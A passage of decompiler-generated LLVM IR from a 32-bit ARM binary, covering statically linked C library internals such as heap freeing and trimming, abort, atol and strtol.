  store i32 %v7_13604, i32* %r3.global-to-local, align 4
  %v1_13608 = load i32, i32* @r5, align 4
  %v2_13608 = add i32 %v1_13608, 8
  %v3_13608 = inttoptr i32 %v2_13608 to i32*
  store i32 %v7_13604, i32* %v3_13608, align 4
  %v0_1360c = load i32, i32* @r5, align 4
  %v1_1360c = load i32, i32* %r2.global-to-local, align 4
  %v2_1360c = load i32, i32* %r1.global-to-local, align 4
  %v5_1360c = mul i32 %v2_1360c, 4
  %v6_1360c = add i32 %v5_1360c, %v1_1360c
  %v7_1360c = inttoptr i32 %v6_1360c to i32*
  store i32 %v0_1360c, i32* %v7_1360c, align 4
  br label %dec_label_pc_13778

dec_label_pc_13614:                               ; preds = %dec_label_pc_13594
  %v1_13614 = and i32 %v3_135d8, 2
  %v2_13614 = icmp eq i32 %v1_13614, 0
  br i1 %v2_13614, label %dec_label_pc_1361c, label %dec_label_pc_13750

dec_label_pc_1361c:                               ; preds = %dec_label_pc_13614
  %v1_1361c = or i32 %v2_135dc, 1
  store i32 %v1_1361c, i32* %r3.global-to-local, align 4
  store i32 %v1_1361c, i32* %v1_135dc, align 4
  %v0_13624 = load i32, i32* @r6, align 4
  %v1_13624 = add i32 %v0_13624, -4
  %v2_13624 = inttoptr i32 %v1_13624 to i32*
  %v3_13624 = load i32, i32* %v2_13624, align 4
  store i32 %v3_13624, i32* %r3.global-to-local, align 4
  %v0_13628 = load i32, i32* @r5, align 4
  %v1_13628 = load i32, i32* %ip.global-to-local, align 4
  %v2_13628 = add i32 %v1_13628, %v0_13628
  store i32 %v2_13628, i32* %lr.global-to-local, align 4
  %v1_1362c = urem i32 %v3_13624, 2
  %v2_1362c = icmp eq i32 %v1_1362c, 0
  %v1_13630 = add i32 %v2_13628, 4
  %v2_13630 = inttoptr i32 %v1_13630 to i32*
  %v3_13630 = load i32, i32* %v2_13630, align 4
  store i32 %v3_13630, i32* %r8.global-to-local, align 4
  br i1 %v2_1362c, label %dec_label_pc_13638, label %dec_label_pc_1366c

dec_label_pc_13638:                               ; preds = %dec_label_pc_1361c
  %v1_13638 = add i32 %v0_13624, -8
  %v2_13638 = inttoptr i32 %v1_13638 to i32*
  %v3_13638 = load i32, i32* %v2_13638, align 4
  store i32 %v3_13638, i32* %r1.global-to-local, align 4
  %v2_1363c = sub i32 %v0_13628, %v3_13638
  store i32 %v2_1363c, i32* %r3.global-to-local, align 4
  %v1_13640 = add i32 %v2_1363c, 8
  %v2_13640 = inttoptr i32 %v1_13640 to i32*
  %v3_13640 = load i32, i32* %v2_13640, align 4
  store i32 %v3_13640, i32* %r2.global-to-local, align 4
  %v1_13644 = add i32 %v3_13640, 12
  %v2_13644 = inttoptr i32 %v1_13644 to i32*
  %v3_13644 = load i32, i32* %v2_13644, align 4
  store i32 %v3_13644, i32* %r4.global-to-local, align 4
  %v9_13648 = icmp eq i32 %v3_13644, %v2_1363c
  %v1_1364c = add i32 %v2_1363c, 12
  %v2_1364c = inttoptr i32 %v1_1364c to i32*
  %v3_1364c = load i32, i32* %v2_1364c, align 4
  store i32 %v3_1364c, i32* %r0.global-to-local, align 4
  br i1 %v9_13648, label %dec_label_pc_13654, label %dec_label_pc_136b8

dec_label_pc_13654:                               ; preds = %dec_label_pc_13638
  %v1_13654 = add i32 %v3_1364c, 8
  %v2_13654 = inttoptr i32 %v1_13654 to i32*
  %v3_13654 = load i32, i32* %v2_13654, align 4
  store i32 %v3_13654, i32* %r3.global-to-local, align 4
  %v9_13658 = icmp eq i32 %v3_13654, %v2_1363c
  br i1 %v9_13658, label %dec_label_pc_13660, label %dec_label_pc_136b8

dec_label_pc_13660:                               ; preds = %dec_label_pc_13654
  store i32 %v3_13640, i32* %v2_13654, align 4
  %v0_13664 = load i32, i32* %r0.global-to-local, align 4
  %v1_13664 = load i32, i32* %r2.global-to-local, align 4
  %v2_13664 = add i32 %v1_13664, 12
  %v3_13664 = inttoptr i32 %v2_13664 to i32*
  store i32 %v0_13664, i32* %v3_13664, align 4
  %v0_13668 = load i32, i32* %ip.global-to-local, align 4
  %v1_13668 = load i32, i32* %r1.global-to-local, align 4
  %v2_13668 = add i32 %v1_13668, %v0_13668
  store i32 %v2_13668, i32* %ip.global-to-local, align 4
  %v0_13678.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1367c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1366c

dec_label_pc_1366c:                               ; preds = %dec_label_pc_1361c, %dec_label_pc_13660
  %v0_136f8 = phi i32 [ %v1_13628, %dec_label_pc_1361c ], [ %v2_13668, %dec_label_pc_13660 ]
  %v0_1367c = phi i32 [ %v3_13630, %dec_label_pc_1361c ], [ %v0_1367c.pre, %dec_label_pc_13660 ]
  %v1_13690 = phi i32 [ %v2_13628, %dec_label_pc_1361c ], [ %v0_13678.pre, %dec_label_pc_13660 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_13670 = load i32, i32* @r7, align 4
  %v2_13670 = add i32 %v0_13670, 64
  %v3_13670 = inttoptr i32 %v2_13670 to i32*
  %v4_13670 = load i32, i32* %v3_13670, align 4
  store i32 %v4_13670, i32* %r2.global-to-local, align 4
  %v1_13674 = add i32 %v4_13670, 44
  %v2_13674 = inttoptr i32 %v1_13674 to i32*
  %v3_13674 = load i32, i32* %v2_13674, align 4
  store i32 %v3_13674, i32* %r3.global-to-local, align 4
  %v9_13678 = icmp eq i32 %v1_13690, %v3_13674
  %v1_1367c = and i32 %v0_1367c, -4
  store i32 %v1_1367c, i32* %r0.global-to-local, align 4
  br i1 %v9_13678, label %dec_label_pc_136f8, label %dec_label_pc_13684

dec_label_pc_13684:                               ; preds = %dec_label_pc_1366c
  %v2_13684 = add i32 %v1_13690, %v1_1367c
  store i32 %v2_13684, i32* %r3.global-to-local, align 4
  %v1_13688 = add i32 %v2_13684, 4
  %v2_13688 = inttoptr i32 %v1_13688 to i32*
  %v3_13688 = load i32, i32* %v2_13688, align 4
  store i32 %v3_13688, i32* %r3.global-to-local, align 4
  %v1_1368c = urem i32 %v3_13688, 2
  %v2_1368c = icmp eq i32 %v1_1368c, 0
  %v2_13690 = add i32 %v1_13690, 4
  %v3_13690 = inttoptr i32 %v2_13690 to i32*
  store i32 %v1_1367c, i32* %v3_13690, align 4
  br i1 %v2_1368c, label %dec_label_pc_13698, label %dec_label_pc_13684.dec_label_pc_136c8_crit_edge

dec_label_pc_13684.dec_label_pc_136c8_crit_edge:  ; preds = %dec_label_pc_13684
  %v0_136d8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_136c8

dec_label_pc_13698:                               ; preds = %dec_label_pc_13684
  %v0_13698 = load i32, i32* %lr.global-to-local, align 4
  %v1_13698 = add i32 %v0_13698, 8
  %v2_13698 = inttoptr i32 %v1_13698 to i32*
  %v3_13698 = load i32, i32* %v2_13698, align 4
  store i32 %v3_13698, i32* %r1.global-to-local, align 4
  %v1_1369c = add i32 %v3_13698, 12
  %v2_1369c = inttoptr i32 %v1_1369c to i32*
  %v3_1369c = load i32, i32* %v2_1369c, align 4
  store i32 %v3_1369c, i32* %r3.global-to-local, align 4
  %v9_136a0 = icmp eq i32 %v3_1369c, %v0_13698
  %v1_136a4 = add i32 %v0_13698, 12
  %v2_136a4 = inttoptr i32 %v1_136a4 to i32*
  %v3_136a4 = load i32, i32* %v2_136a4, align 4
  store i32 %v3_136a4, i32* %r2.global-to-local, align 4
  br i1 %v9_136a0, label %dec_label_pc_136ac, label %dec_label_pc_136b8

dec_label_pc_136ac:                               ; preds = %dec_label_pc_13698
  %v1_136ac = add i32 %v3_136a4, 8
  %v2_136ac = inttoptr i32 %v1_136ac to i32*
  %v3_136ac = load i32, i32* %v2_136ac, align 4
  store i32 %v3_136ac, i32* %r3.global-to-local, align 4
  %v9_136b0 = icmp eq i32 %v3_136ac, %v0_13698
  br i1 %v9_136b0, label %dec_label_pc_136bc, label %dec_label_pc_136b8

dec_label_pc_136b8:                               ; preds = %dec_label_pc_13698, %dec_label_pc_13654, %dec_label_pc_13638, %dec_label_pc_136ac
  %v0_136b8 = call i32 @abort()
  store i32 %v0_136b8, i32* %r0.global-to-local, align 4
  %v0_136bc.pre = load i32, i32* @r1, align 4
  %v1_136bc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_136bc

dec_label_pc_136bc:                               ; preds = %dec_label_pc_136ac, %dec_label_pc_136b8
  %v1_136bc = phi i32 [ %v3_136a4, %dec_label_pc_136ac ], [ %v1_136bc.pre, %dec_label_pc_136b8 ]
  %v0_136bc = phi i32 [ %v3_13698, %dec_label_pc_136ac ], [ %v0_136bc.pre, %dec_label_pc_136b8 ]
  %v2_136bc = add i32 %v1_136bc, 8
  %v3_136bc = inttoptr i32 %v2_136bc to i32*
  store i32 %v0_136bc, i32* %v3_136bc, align 4
  %v0_136c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_136c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_136c0 = add i32 %v1_136c0, 12
  %v3_136c0 = inttoptr i32 %v2_136c0 to i32*
  store i32 %v0_136c0, i32* %v3_136c0, align 4
  %v0_136c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_136c4 = load i32, i32* %r0.global-to-local, align 4
  %v2_136c4 = add i32 %v1_136c4, %v0_136c4
  store i32 %v2_136c4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_136c8

dec_label_pc_136c8:                               ; preds = %dec_label_pc_13684.dec_label_pc_136c8_crit_edge, %dec_label_pc_136bc
  %v0_136d8 = phi i32 [ %v0_136d8.pre, %dec_label_pc_13684.dec_label_pc_136c8_crit_edge ], [ %v2_136c4, %dec_label_pc_136bc ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_136cc = load i32, i32* @r7, align 4
  %v2_136cc = add i32 %v0_136cc, 64
  %v3_136cc = inttoptr i32 %v2_136cc to i32*
  %v4_136cc = load i32, i32* %v3_136cc, align 4
  %v1_136d0 = add i32 %v4_136cc, 52
  store i32 %v1_136d0, i32* %r3.global-to-local, align 4
  %v1_136d4 = add i32 %v4_136cc, 60
  %v2_136d4 = inttoptr i32 %v1_136d4 to i32*
  %v3_136d4 = load i32, i32* %v2_136d4, align 4
  store i32 %v3_136d4, i32* %r1.global-to-local, align 4
  %v1_136d8 = or i32 %v0_136d8, 1
  store i32 %v1_136d8, i32* %r2.global-to-local, align 4
  %v1_136dc = load i32, i32* %r4.global-to-local, align 4
  %v2_136dc = add i32 %v1_136dc, 12
  %v3_136dc = inttoptr i32 %v2_136dc to i32*
  store i32 %v1_136d0, i32* %v3_136dc, align 4
  %v0_136e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_136e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_136e0 = add i32 %v1_136e0, 8
  %v3_136e0 = inttoptr i32 %v2_136e0 to i32*
  store i32 %v0_136e0, i32* %v3_136e0, align 4
  %v0_136e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_136e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_136e4 = add i32 %v1_136e4, 4
  %v3_136e4 = inttoptr i32 %v2_136e4 to i32*
  store i32 %v0_136e4, i32* %v3_136e4, align 4
  %v0_136e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_136e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_136e8 = add i32 %v1_136e8, %v0_136e8
  %v4_136e8 = inttoptr i32 %v3_136e8 to i32*
  store i32 %v0_136e8, i32* %v4_136e8, align 4
  %v0_136ec = load i32, i32* %r4.global-to-local, align 4
  %v1_136ec = load i32, i32* %r1.global-to-local, align 4
  %v2_136ec = add i32 %v1_136ec, 12
  %v3_136ec = inttoptr i32 %v2_136ec to i32*
  store i32 %v0_136ec, i32* %v3_136ec, align 4
  %v0_136f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_136f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_136f0 = add i32 %v1_136f0, 8
  %v3_136f0 = inttoptr i32 %v2_136f0 to i32*
  store i32 %v0_136f0, i32* %v3_136f0, align 4
  br label %dec_label_pc_13708

dec_label_pc_136f8:                               ; preds = %dec_label_pc_1366c
  %v2_136f8 = add i32 %v1_1367c, %v0_136f8
  store i32 %v2_136f8, i32* %ip.global-to-local, align 4
  %v1_136fc = or i32 %v2_136f8, 1
  store i32 %v1_136fc, i32* %r3.global-to-local, align 4
  %v0_13700 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13700, i32* %v2_13674, align 4
  %v0_13704 = load i32, i32* %r3.global-to-local, align 4
  %v1_13704 = load i32, i32* %r4.global-to-local, align 4
  %v2_13704 = add i32 %v1_13704, 4
  %v3_13704 = inttoptr i32 %v2_13704 to i32*
  store i32 %v0_13704, i32* %v3_13704, align 4
  br label %dec_label_pc_13708

dec_label_pc_13708:                               ; preds = %dec_label_pc_136c8, %dec_label_pc_136f8
  %v0_13708 = load i32, i32* %ip.global-to-local, align 4
  %v3_1370c = icmp ult i32 %v0_13708, 131070
  br i1 %v3_1370c, label %dec_label_pc_13778, label %dec_label_pc_13710

dec_label_pc_13710:                               ; preds = %dec_label_pc_13708
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_13714 = load i32, i32* @r7, align 4
  %v2_13714 = add i32 %v0_13714, 64
  %v3_13714 = inttoptr i32 %v2_13714 to i32*
  %v4_13714 = load i32, i32* %v3_13714, align 4
  store i32 %v4_13714, i32* @r4, align 4
  %v1_13718 = inttoptr i32 %v4_13714 to i32*
  %v2_13718 = load i32, i32* %v1_13718, align 4
  store i32 %v2_13718, i32* %r3.global-to-local, align 4
  %v1_1371c = and i32 %v2_13718, 2
  %v2_1371c = icmp eq i32 %v1_1371c, 0
  br i1 %v2_1371c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_13710
  store i32 %v4_13714, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_13710, %bb
  %v1_13724 = xor i1 %v2_1371c, true
  call void @__pseudo_cond_branch(i1 %v1_13724, i32 ptrtoint (i32* @global_var_133c8.472 to i32))
  %v0_13728 = load i32, i32* @r4, align 4
  %v1_13728 = add i32 %v0_13728, 44
  %v2_13728 = inttoptr i32 %v1_13728 to i32*
  %v3_13728 = load i32, i32* %v2_13728, align 4
  store i32 %v3_13728, i32* %r3.global-to-local, align 4
  %v1_1372c = add i32 %v3_13728, 4
  %v2_1372c = inttoptr i32 %v1_1372c to i32*
  %v3_1372c = load i32, i32* %v2_1372c, align 4
  store i32 %v3_1372c, i32* %r3.global-to-local, align 4
  %v1_13730 = add i32 %v0_13728, 836
  %v2_13730 = inttoptr i32 %v1_13730 to i32*
  %v3_13730 = load i32, i32* %v2_13730, align 4
  store i32 %v3_13730, i32* %r2.global-to-local, align 4
  %v1_13734 = and i32 %v3_1372c, -4
  store i32 %v1_13734, i32* %r3.global-to-local, align 4
  %v3_13738 = icmp ult i32 %v1_13734, %v3_13730
  br i1 %v3_13738, label %dec_label_pc_13778, label %dec_label_pc_13740

dec_label_pc_13740:                               ; preds = %bb16
  store i32 %v0_13728, i32* %r1.global-to-local, align 4
  %v1_13744 = add i32 %v0_13728, 840
  %v2_13744 = inttoptr i32 %v1_13744 to i32*
  %v3_13744 = load i32, i32* %v2_13744, align 4
  store i32 %v3_13744, i32* %r0.global-to-local, align 4
  %v2_13748 = call i32 @__malloc_trim(i32 %v3_13744, i32 %v0_13728)
  store i32 %v2_13748, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13778

dec_label_pc_13750:                               ; preds = %dec_label_pc_13614
  %v2_13750 = inttoptr i32 %v1_135e4 to i32*
  %v3_13750 = load i32, i32* %v2_13750, align 4
  store i32 %v3_13750, i32* %r0.global-to-local, align 4
  %v1_13754 = add i32 %v4_135d4, 848
  %v2_13754 = inttoptr i32 %v1_13754 to i32*
  %v3_13754 = load i32, i32* %v2_13754, align 4
  store i32 %v3_13754, i32* %r2.global-to-local, align 4
  %v1_13758 = add i32 %v4_135d4, 868
  %v2_13758 = inttoptr i32 %v1_13758 to i32*
  %v3_13758 = load i32, i32* %v2_13758, align 4
  %v2_1375c = add i32 %v3_13750, %v1_135e0
  store i32 %v2_1375c, i32* %r1.global-to-local, align 4
  %v1_13760 = add i32 %v3_13754, -1
  store i32 %v1_13760, i32* %r2.global-to-local, align 4
  %v2_13764 = sub i32 %v3_13758, %v2_1375c
  store i32 %v2_13764, i32* %r3.global-to-local, align 4
  store i32 %v2_13764, i32* %v2_13758, align 4
  %v1_1376c = load i32, i32* @lr, align 4
  %v2_1376c = add i32 %v1_1376c, 848
  %v3_1376c = inttoptr i32 %v2_1376c to i32*
  store i32 %v1_13760, i32* %v3_1376c, align 4
  %v0_13770 = load i32, i32* %r0.global-to-local, align 4
  %v1_13770 = load i32, i32* @r5, align 4
  %v2_13770 = sub i32 %v1_13770, %v0_13770
  store i32 %v2_13770, i32* %r0.global-to-local, align 4
  %v4_13774 = call i32 @munmap(i32 %v2_13770, i32 %v2_1375c, i32 %v1_13760, i32 %v2_13764)
  store i32 %v4_13774, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13778

dec_label_pc_13778:                               ; preds = %bb16, %dec_label_pc_13708, %dec_label_pc_13740, %dec_label_pc_135f4, %dec_label_pc_13750
  store i32 %v2_13588, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_13784 = load i32, i32* @r7, align 4
  %v2_13784 = add i32 %v0_13784, 44
  %v3_13784 = inttoptr i32 %v2_13784 to i32*
  %v4_13784 = load i32, i32* %v3_13784, align 4
  store i32 %v4_13784, i32* %ip.global-to-local, align 4
  store i32 79760, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13784)
  br label %dec_label_pc_13790

dec_label_pc_13790:                               ; preds = %entry, %dec_label_pc_13778
  store i32 %v3_1357c, i32* @r4, align 4
  store i32 %v6_1357c, i32* @r5, align 4
  store i32 %v9_1357c, i32* @r6, align 4
  store i32 %v12_1357c, i32* @r7, align 4
  store i32 %v18_1357c, i32* @lr, align 4
  ret i32 %v2_13588

; uselistorder directives
  uselistorder i32 %v0_13728, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_136e8, { 1, 0 }
  uselistorder i32 %v1_13628, { 1, 0 }
  uselistorder i32 %v0_13628, { 1, 0 }
  uselistorder i32 %v3_135fc, { 1, 0 }
  uselistorder i32 %v1_135e0, { 1, 0, 2 }
  uselistorder i32 %v2_135dc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_135d4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13584, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_13790, { 1, 0 }
  uselistorder label %dec_label_pc_13778, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_13708, { 1, 0 }
  uselistorder label %dec_label_pc_136c8, { 1, 0 }
  uselistorder label %dec_label_pc_136bc, { 1, 0 }
  uselistorder label %dec_label_pc_136b8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1366c, { 1, 0 }
}

define i32 @function_137a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_137a0:
  %v0_137a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_137a0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_137a0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_137a0, %bb
  %v4_137b4 = phi i32 [ %arg1, %dec_label_pc_137a0 ], [ 0, %bb ]
  ret i32 %v4_137b4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_137b8 = load i32, i32* @r4, align 4
  store i32 %v3_137b8, i32* %stack_var_-12, align 4
  %v6_137b8 = load i32, i32* @r5, align 4
  %v4_137c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_137c8, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_137c8, i32* @r0, align 4
  %v0_137d8 = call i32 @__malloc_consolidate()
  %v0_137dc = load i32, i32* @r4, align 4
  %v0_137e0 = load i32, i32* @r5, align 4
  %v2_137e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_137e8, i32* @r4, align 4
  store i32 %v6_137b8, i32* @r5, align 4
  %v2_137ec = call i32 @__malloc_trim(i32 %v0_137dc, i32 %v0_137e0)
  %v0_137f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_137f0, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_137f4 = phi i32 [ %v2_137ec, %entry ], [ 0, %bb ]
  ret i32 %v4_137f4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r5, align 4
  %v4_13810 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 16) to i32*), align 4
  store i32 79900, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13810)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_13838 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_13840 = load i32, i32* @r5, align 4
  %v2_13840 = add i32 %v0_13840, 632
  %v3_13840 = inttoptr i32 %v2_13840 to i32*
  %v4_13840 = load i32, i32* %v3_13840, align 4
  %v2_13844 = icmp eq i32 %v4_13840, 0
  br i1 %v2_13844, label %dec_label_pc_1384c, label %dec_label_pc_1388c

dec_label_pc_1384c:                               ; preds = %entry
  store i32 1, i32* %v3_13840, align 4
  br label %dec_label_pc_13854

dec_label_pc_13854:                               ; preds = %dec_label_pc_1389c, %dec_label_pc_1384c
  %v0_13858 = load i32, i32* @r5, align 4
  %v2_13858 = add i32 %v0_13858, 212
  store i32 %v2_13858, i32* @r4, align 4
  %v2_13864 = add i32 %v0_13858, 68
  %v3_13864 = inttoptr i32 %v2_13864 to i32*
  %v4_13864 = load i32, i32* %v3_13864, align 4
  call void @__pseudo_branch(i32 %v4_13864)
  %v1_13874 = call i32 @__GI_raise(i32 6)
  %v0_13880 = load i32, i32* @r5, align 4
  %v2_13880 = add i32 %v0_13880, 16
  %v3_13880 = inttoptr i32 %v2_13880 to i32*
  %v4_13880 = load i32, i32* %v3_13880, align 4
  store i32 80012, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13880)
  %v0_13890.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1388c

dec_label_pc_1388c:                               ; preds = %entry, %dec_label_pc_13854
  %v1_138a4 = phi i32 [ %v0_13840, %entry ], [ %v0_13890.pre, %dec_label_pc_13854 ]
  %v2_13890 = add i32 %v1_138a4, 632
  %v3_13890 = inttoptr i32 %v2_13890 to i32*
  %v4_13890 = load i32, i32* %v3_13890, align 4
  %v7_13894 = icmp eq i32 %v4_13890, 1
  br i1 %v7_13894, label %dec_label_pc_1389c, label %dec_label_pc_138d8

dec_label_pc_1389c:                               ; preds = %dec_label_pc_1388c
  %v2_1389c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1389c, i32* @r4, align 4
  store i32 2, i32* %v3_13890, align 4
  %v3_138b4 = bitcast i32* %stack_var_-28 to i8*
  %v4_138b4 = call i32 @__GI_memset(i8* %v3_138b4, i32 0, i32 20)
  %v3_138d0 = call i32 @__libc_sigaction(i32 6, i32 %v2_1389c, i32 0)
  br label %dec_label_pc_13854

dec_label_pc_138d8:                               ; preds = %dec_label_pc_1388c
  %v7_138d8 = icmp eq i32 %v4_13890, 2
  br i1 %v7_138d8, label %dec_label_pc_138e0, label %dec_label_pc_138ec

dec_label_pc_138e0:                               ; preds = %dec_label_pc_138d8
  store i32 3, i32* %v3_13890, align 4
  %v0_138e8 = call i32 @abort()
  %v0_138ec.pre = load i32, i32* @r5, align 4
  %v1_138ec.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_138ec

dec_label_pc_138ec:                               ; preds = %dec_label_pc_138d8, %dec_label_pc_138e0
  %v3_138f8 = phi i32 [ 632, %dec_label_pc_138d8 ], [ %v1_138ec.pre, %dec_label_pc_138e0 ]
  %v2_138f8 = phi i32 [ %v1_138a4, %dec_label_pc_138d8 ], [ %v0_138ec.pre, %dec_label_pc_138e0 ]
  %v2_138ec = add i32 %v2_138f8, %v3_138f8
  %v3_138ec = inttoptr i32 %v2_138ec to i32*
  %v4_138ec = load i32, i32* %v3_138ec, align 4
  %v7_138f0 = icmp eq i32 %v4_138ec, 3
  br i1 %v7_138f0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_138ec
  store i32 4, i32* %v3_138ec, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_138ec, %bb
  call void @__pseudo_cond_branch(i1 %v7_138f0, i32 ptrtoint (i32* @global_var_154d0.481 to i32))
  br label %dec_label_pc_13904

dec_label_pc_13904:                               ; preds = %dec_label_pc_13904, %.thread2
  %v0_13904 = call i32 @abort()
  br label %dec_label_pc_13904

; uselistorder directives
  uselistorder i32* %v3_13890, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_138ec, { 1, 0 }
  uselistorder label %dec_label_pc_1388c, { 1, 0 }
}

define i32 @function_13910(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13910:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_13910 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13910, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13910
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13910, %bb
  %v4_1391c = phi i32 [ %tmp, %dec_label_pc_13910 ], [ 0, %bb ]
  ret i32 %v4_1391c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_13930 = call i32 @strtol()
  ret i32 %v0_13930
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_1394c = call i32 @_stdlib_strto_l()
  ret i32 %v0_1394c
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %ip.global-to-local, align 4
  %v0_13970 = load i32, i32* @r1, align 4
  store i32 %v0_13970, i32* %sb.global-to-local, align 4
  %v0_13974 = load i32, i32* @r2, align 4
  store i32 %v0_13974, i32* %r5.global-to-local, align 4
  %v0_13978 = load i32, i32* @r0, align 4
  store i32 %v0_13978, i32* %r4.global-to-local, align 4
  %v0_1397c = load i32, i32* @r3, align 4
  br label %dec_label_pc_13988

dec_label_pc_13984:                               ; preds = %dec_label_pc_13988
  %v1_13984 = add i32 %v0_139c0, 1
  store i32 %v1_13984, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13988

dec_label_pc_13988:                               ; preds = %entry, %dec_label_pc_13984
  %v0_139c0 = phi i32 [ %v0_13978, %entry ], [ %v1_13984, %dec_label_pc_13984 ]
  %v1_13988 = inttoptr i32 %v0_139c0 to i8*
  %v2_13988 = load i8, i8* %v1_13988, align 1
  %v3_13988 = zext i8 %v2_13988 to i32
  store i32 %v3_13988, i32* %r1.global-to-local, align 4
  %v4_1398c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 276) to i32*), align 4
  %v2_13990 = mul nuw nsw i32 %v3_13988, 2
